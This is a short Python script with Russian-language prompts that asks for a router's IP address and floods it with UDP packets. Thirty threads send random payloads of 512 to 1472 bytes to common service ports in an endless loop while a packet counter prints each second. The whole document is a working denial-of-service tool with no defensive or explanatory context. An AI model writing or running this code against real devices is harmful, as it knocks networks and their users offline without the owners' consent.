import socket
import threading
import time
import random

target = input("IP роутера: ")
count = 0
lock = threading.Lock()

def udp_flood():
    global count
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    ports = [53, 123, 161, 1900, 5353, 80, 443, 22]
    while True:
        port = random.choice(ports)
        size = random.randint(512, 1472)  
        data = random._urandom(size)
        try:
            sock.sendto(data, (target, port))
            with lock:
                count += 1
        except:
            pass

for i in range(30):
    threading.Thread(target=udp_flood, daemon=True).start()

while True:
    print(f"Пакетов: {count}")
    time.sleep(1)
